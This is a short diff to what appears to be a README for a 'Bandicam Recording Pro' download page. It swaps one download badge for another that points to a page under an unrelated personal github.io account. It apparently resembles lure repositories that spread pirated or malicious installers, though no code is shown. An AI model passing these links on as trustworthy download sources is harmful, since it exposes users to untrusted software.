@@ -4,10 +4,7 @@
   <img src="https://static.bandicam.com/company/logo/bandicam_logo_dark.png" alt="Bandicam Recording Pro Logo"/>
 </div>
 
-<div align="center">
-  
-  [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://bandicam-screen-recorder.github.io/.github)
-</div>
+[![GET Bandicam Screen](https://img.shields.io/badge/GET%20%E2%80%94%20Bandicam-Screen-0078D6?style=for-the-badge&logoColor=white)](https://sarahlopezt597.github.io/.github/Bandicam-Screen)
 
 ---
 
